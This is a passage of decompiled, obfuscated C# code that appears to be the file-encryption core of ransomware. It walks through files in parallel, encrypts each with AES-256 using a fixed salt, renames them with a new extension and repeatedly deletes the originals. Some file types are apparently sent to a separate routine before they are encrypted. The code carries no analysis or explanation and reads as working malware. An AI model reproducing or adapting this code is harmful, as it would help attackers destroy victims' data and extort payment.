											if (CS_0024_003C_003E8__locals0.qzLjjzzlXxK.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.ikAVEYXdWFLemgx.EvGDFwQHbzXMTU) && pAghGHVkfTo == zMMiSiOLxsKC.fEeJrRiVizKd.getString_0(107396963))
											{
												if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qzLjjzzlXxK).Length)
												{
													try
													{
														fkiONJkXtes.ZBkgeKIejBXVf(zMMiSiOLxsKC.fEeJrRiVizKd.getString_0(107352295), zMMiSiOLxsKC.fEeJrRiVizKd.getString_0(107352322), zMMiSiOLxsKC.fEeJrRiVizKd.getString_0(107352277), CS_0024_003C_003E8__locals0.qzLjjzzlXxK);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.qzLjjzzlXxK.ToLower().EndsWith(item) && pAghGHVkfTo == zMMiSiOLxsKC.fEeJrRiVizKd.getString_0(107397181))
											{
												try
												{
													fkiONJkXtes.ZBkgeKIejBXVf(zMMiSiOLxsKC.fEeJrRiVizKd.getString_0(107352295), zMMiSiOLxsKC.fEeJrRiVizKd.getString_0(107352322), zMMiSiOLxsKC.fEeJrRiVizKd.getString_0(107352277), CS_0024_003C_003E8__locals0.qzLjjzzlXxK);
												}
												catch
												{
												}
											}
										}
									});
									thread4.Priority = ThreadPriority.Normal;
									thread4.IsBackground = false;
									thread4.Start();
								}
								string text3 = CPOlMgiMtrt.qfsgcgZBmwQ(32);
								string s3 = ZrbAiQSenEN.PvVgiztDRoWbhs(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (ZapXHYEcfcRlj == zMMiSiOLxsKC.getString_0(107397174))
								{
									byte[] array2 = null;
									byte[] byte_2 = bQwLemggMIXO.JPoqfLkNbop(CS_0024_003C_003E8__locals0.qzLjjzzlXxK, Convert.ToInt32(ySwjQogNty) * 1024 * 1024);
									bQwLemggMIXO.feLfHlEZaImINg(gfVWmhJNzzTr: (!tbUmPYlAGHV) ? (XuGnEkReQEL ? bQwLemggMIXO.FIiJNguIBznfy(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : bQwLemggMIXO.FIiJNguIBznfy(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.foDfHTmkRAByYW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (XuGnEkReQEL ? idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.foDfHTmkRAByYW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), UJrBcShqTfC: CS_0024_003C_003E8__locals0.qzLjjzzlXxK, UzwiGYbBhSc: bytes3);
								}
								else if (!XuGnEkReQEL)
								{
									OtwBgoVUjwmos.PDnoxZCfZtLYh(CS_0024_003C_003E8__locals0.qzLjjzzlXxK, ySwjQogNty, CS_0024_003C_003E8__locals0.foDfHTmkRAByYW);
								}
								else
								{
									OtwBgoVUjwmos.PDnoxZCfZtLYh(CS_0024_003C_003E8__locals0.qzLjjzzlXxK, ySwjQogNty, text3, bytes3);
								}
							}
							else
							{
								if (EovHtqNdKKIO)
								{
									CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU = SNoRzClPbgpw + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU;
								}
								string text4 = CPOlMgiMtrt.qfsgcgZBmwQ(32);
								string s4 = ZrbAiQSenEN.PvVgiztDRoWbhs(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU != zMMiSiOLxsKC.getString_0(107349127))
								{
									if (!SeGgjnhvEXrLE)
									{
										if (!XuGnEkReQEL)
										{
											bEqndNQCJNJKtx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, MrSCMslRwDw);
										}
										else
										{
											bEqndNQCJNJKtx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!XuGnEkReQEL)
											{
												BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, MrSCMslRwDw);
											}
											else
											{
												BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (mLogOAlXxCGZma)
											{
												try
												{
													File.AppendAllText(PuxbPamNEvKf, zMMiSiOLxsKC.getString_0(107349895) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107349145) + ex16.Message + zMMiSiOLxsKC.getString_0(107396630));
												}
												catch (Exception)
												{
												}
											}
											slRUPIhEEasxMv++;
											goto end_IL_0175_2;
										}
									}
								}
								else if (!SeGgjnhvEXrLE)
								{
									if (!XuGnEkReQEL)
									{
										bEqndNQCJNJKtx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107349122), MrSCMslRwDw);
									}
									else
									{
										bEqndNQCJNJKtx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107349122), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!XuGnEkReQEL)
										{
											BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, MrSCMslRwDw);
										}
										else
										{
											BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (mLogOAlXxCGZma)
										{
											try
											{
												File.AppendAllText(PuxbPamNEvKf, zMMiSiOLxsKC.getString_0(107349895) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107349145) + ex18.Message + zMMiSiOLxsKC.getString_0(107396630));
											}
											catch (Exception)
											{
											}
										}
										slRUPIhEEasxMv++;
										goto end_IL_0175_2;
									}
								}
								if (XuGnEkReQEL)
								{
									if (CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU != zMMiSiOLxsKC.getString_0(107349127))
									{
										sVisjIxCcpCfhZ(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, bytes4);
									}
									else
									{
										sVisjIxCcpCfhZ(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, bytes4);
									}
								}
							}
							goto IL_08c7;
							end_IL_0175_2:;
						}
						catch (Exception)
						{
							goto IL_08c7;
						}
					}
					continue;
					IL_08c7:
					CS_0024_003C_003E8__locals0.hfUdwvPqriEs.Remove(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.hfUdwvPqriEs, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new zMMiSiOLxsKC.GQoWgEQAMkRJ();
			CS_0024_003C_003E8__locals0.ikAVEYXdWFLemgx = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.EYLJWjtdbaGR = string_0;
			if (CS_0024_003C_003E8__locals0.UYtVQBGvNFN.Length != 0)
			{
				string[] uYtVQBGvNFN = CS_0024_003C_003E8__locals0.UYtVQBGvNFN;
				int num = 0;
				while (num < uYtVQBGvNFN.Length)
				{
					string value = uYtVQBGvNFN[num];
					if (!CS_0024_003C_003E8__locals0.EYLJWjtdbaGR.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0842;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.EYLJWjtdbaGR.EndsWith(CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU))
				{
					goto IL_0842;
				}
			}
			catch (Exception)
			{
				goto IL_0842;
			}
			if (!jehTyctIFoYNIp.Contains(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR))
			{
				if (iGHIvdzAxB == zMMiSiOLxsKC.getString_0(107396956))
				{
					try
					{
						if (uTemtccfmqlz.LQwWDAYgIIgx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR))
						{
							uTemtccfmqlz.bplRcjkgXsd(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
						}
					}
					catch
					{
					}
				}
				jehTyctIFoYNIp.Add(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (UlBNnyiBkggp)
						{
							Console.WriteLine(zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107365790) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107365253) + new FileInfo(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR).Length + zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107365200));
							Console.WriteLine(zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107365223), jehTyctIFoYNIp.Count, oNVtehkGXSvfD, slRUPIhEEasxMv);
							Console.WriteLine(zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107365134), tFNHpewWORLeMw.Elapsed);
							Console.WriteLine(zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107365109));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!nWxaVjFaAUH.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR)))
				{
					nWxaVjFaAUH.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR));
				}
				KKPEHOUPlrnQr(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR).Length != 0L)
						{
							goto end_IL_0142;
						}
						goto end_IL_0142_2;
						end_IL_0142:;
					}
					catch (Exception ex2)
					{
						if (mLogOAlXxCGZma)
						{
							try
							{
								File.AppendAllText(PuxbPamNEvKf, zMMiSiOLxsKC.getString_0(107349895) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107365906) + ex2.Message + zMMiSiOLxsKC.getString_0(107396630));
							}
							catch (Exception)
							{
							}
						}
						slRUPIhEEasxMv++;
						goto end_IL_0142_2;
					}
					if (jJEHaHJsPqMKE == zMMiSiOLxsKC.getString_0(107396956) && new FileInfo(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR).Length > Convert.ToInt32(ySwjQogNty) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU != zMMiSiOLxsKC.getString_0(107349127))
							{
								if (EovHtqNdKKIO)
								{
									CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU = SNoRzClPbgpw + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU;
								}
								File.Move(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU);
							}
						}
						catch (Exception ex4)
						{
							if (mLogOAlXxCGZma)
							{
								try
								{
									File.AppendAllText(PuxbPamNEvKf, zMMiSiOLxsKC.getString_0(107349895) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107365845) + ex4.Message + zMMiSiOLxsKC.getString_0(107396630));
								}
								catch (Exception)
								{
								}
							}
							slRUPIhEEasxMv++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU != zMMiSiOLxsKC.getString_0(107349127))
						{
							CS_0024_003C_003E8__locals0.EYLJWjtdbaGR += CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU;
						}
						if (uOaGmGyltMwB == zMMiSiOLxsKC.getString_0(107396956))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in qGlQdkkhGGe)
								{
									if (CS_0024_003C_003E8__locals0.EYLJWjtdbaGR.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.ikAVEYXdWFLemgx.EvGDFwQHbzXMTU) && pAghGHVkfTo == zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107396966))
									{
										if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR).Length)
										{
											try
											{
												fkiONJkXtes.ZBkgeKIejBXVf(zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107352298), zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107352325), zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107352280), CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.EYLJWjtdbaGR.ToLower().EndsWith(item2) && pAghGHVkfTo == zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107397184))
									{
										try
										{
											fkiONJkXtes.ZBkgeKIejBXVf(zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107352298), zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107352325), zMMiSiOLxsKC.GQoWgEQAMkRJ.getString_0(107352280), CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
										}
										catch
										{
										}
									}
								}
							});
							thread2.IsBackground = false;
							thread2.Priority = ThreadPriority.Normal;
							thread2.Start();
						}
						string text = CPOlMgiMtrt.qfsgcgZBmwQ(32);
						string s = ZrbAiQSenEN.PvVgiztDRoWbhs(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (ZapXHYEcfcRlj == zMMiSiOLxsKC.getString_0(107397174))
						{
							byte[] array = null;
							byte[] byte_ = bQwLemggMIXO.JPoqfLkNbop(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, Convert.ToInt32(ySwjQogNty) * 1024 * 1024);
							bQwLemggMIXO.feLfHlEZaImINg(gfVWmhJNzzTr: (!tbUmPYlAGHV) ? (XuGnEkReQEL ? bQwLemggMIXO.FIiJNguIBznfy(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : bQwLemggMIXO.FIiJNguIBznfy(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.foDfHTmkRAByYW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (XuGnEkReQEL ? idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.foDfHTmkRAByYW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), UJrBcShqTfC: CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, UzwiGYbBhSc: bytes);
						}
						else if (!XuGnEkReQEL)
						{
							OtwBgoVUjwmos.PDnoxZCfZtLYh(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, ySwjQogNty, CS_0024_003C_003E8__locals0.foDfHTmkRAByYW);
						}
						else
						{
							OtwBgoVUjwmos.PDnoxZCfZtLYh(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, ySwjQogNty, text, bytes);
						}
					}
					else
					{
						if (EovHtqNdKKIO)
						{
							CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU = SNoRzClPbgpw + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU;
						}
						string text2 = CPOlMgiMtrt.qfsgcgZBmwQ(32);
						string s2 = ZrbAiQSenEN.PvVgiztDRoWbhs(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU != zMMiSiOLxsKC.getString_0(107349127))
						{
							if (!SeGgjnhvEXrLE)
							{
								if (!XuGnEkReQEL)
								{
									bEqndNQCJNJKtx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, MrSCMslRwDw);
								}
								else
								{
									bEqndNQCJNJKtx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!XuGnEkReQEL)
									{
										BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, MrSCMslRwDw);
									}
									else
									{
										BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (mLogOAlXxCGZma)
									{
										try
										{
											File.AppendAllText(PuxbPamNEvKf, zMMiSiOLxsKC.getString_0(107349895) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107349145) + ex6.Message + zMMiSiOLxsKC.getString_0(107396630));
										}
										catch (Exception)
										{
										}
									}
									slRUPIhEEasxMv++;
									return;
								}
							}
						}
						else if (!SeGgjnhvEXrLE)
						{
							if (!XuGnEkReQEL)
							{
								bEqndNQCJNJKtx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107349122), MrSCMslRwDw);
							}
							else
							{
								bEqndNQCJNJKtx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107349122), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!XuGnEkReQEL)
								{
									BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, MrSCMslRwDw);
								}
								else
								{
									BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (mLogOAlXxCGZma)
								{
									try
									{
										File.AppendAllText(PuxbPamNEvKf, zMMiSiOLxsKC.getString_0(107349895) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107349145) + ex8.Message + zMMiSiOLxsKC.getString_0(107396630));
									}
									catch (Exception)
									{
									}
								}
								slRUPIhEEasxMv++;
								return;
							}
						}
						if (XuGnEkReQEL)
						{
							if (CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU != zMMiSiOLxsKC.getString_0(107349127))
							{
								sVisjIxCcpCfhZ(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU, bytes2);
							}
							else
							{
								sVisjIxCcpCfhZ(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, bytes2);
							}
						}
					}
					end_IL_0142_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0842;
			IL_0842:
			CS_0024_003C_003E8__locals0.hfUdwvPqriEs.Remove(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
		});
	}

	private static void zojThLSqDppEmCQnC(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (uOaGmGyltMwB == getString_0(107396939))
					{
						foreach (string item in qGlQdkkhGGe)
						{
							if (string_0.ToLower().EndsWith(item) && pAghGHVkfTo == getString_0(107396939))
							{
								if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352271), getString_0(107352298), getString_0(107352253), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && pAghGHVkfTo == getString_0(107397157))
							{
								try
								{
									fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352271), getString_0(107352298), getString_0(107352253), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107349105)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107349105), getString_0(107352222)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void BwaaJjHcbeJUZT(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (uOaGmGyltMwB == getString_0(107396939))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in qGlQdkkhGGe)
			{
				if (string_0.ToLower().EndsWith(item) && pAghGHVkfTo == getString_0(107396939))
				{
					if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352271), getString_0(107352298), getString_0(107352253), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && pAghGHVkfTo == getString_0(107397157))
				{
					try
					{
						fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352271), getString_0(107352298), getString_0(107352253), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = idTumjwtCKpZx.hLiqKlBgJzHKEXvg(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		oNVtehkGXSvfD++;
	}

	private static void bEqndNQCJNJKtx(string string_0, string string_1, byte[] byte_0)
	{
		IFBDzGiIHqaq CS_0024_003C_003E8__locals0 = new IFBDzGiIHqaq();
		CS_0024_003C_003E8__locals0.TiXuEtVXJO = string_0;
		CS_0024_003C_003E8__locals0.ffhyRdTPLEAt = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string ffhyRdTPLEAt = CS_0024_003C_003E8__locals0.ffhyRdTPLEAt;
			FileStream fileStream = new FileStream(ffhyRdTPLEAt, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (RnjVpuumuPDdKRf == getString_0(107396939))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.TiXuEtVXJO, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.TiXuEtVXJO, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.TiXuEtVXJO, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.ffhyRdTPLEAt.Length > 0)
				{
					if (uOaGmGyltMwB == getString_0(107396939))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.TiXuEtVXJO, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in qGlQdkkhGGe)
						{
							if (CS_0024_003C_003E8__locals0.TiXuEtVXJO.ToLower().EndsWith(item) && pAghGHVkfTo == getString_0(107396939))
							{
								if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352271), getString_0(107352298), getString_0(107352253), CS_0024_003C_003E8__locals0.TiXuEtVXJO);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.TiXuEtVXJO.ToLower().EndsWith(item) && pAghGHVkfTo == getString_0(107397157))
							{
								try
								{
									fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352271), getString_0(107352298), getString_0(107352253), CS_0024_003C_003E8__locals0.TiXuEtVXJO);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.TiXuEtVXJO);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.ffhyRdTPLEAt.EndsWith(getString_0(107349105)))
					{
						File.Move(CS_0024_003C_003E8__locals0.ffhyRdTPLEAt, CS_0024_003C_003E8__locals0.ffhyRdTPLEAt.Replace(getString_0(107349105), getString_0(107352222)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.ffhyRdTPLEAt))
							{
								File.Delete(CS_0024_003C_003E8__locals0.ffhyRdTPLEAt);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (mLogOAlXxCGZma)
			{
				try
				{
					File.AppendAllText(PuxbPamNEvKf, getString_0(107349878) + CS_0024_003C_003E8__locals0.TiXuEtVXJO + getString_0(107349128) + ex2.Message + getString_0(107396613));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = aeDxyjZzVlIXe;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
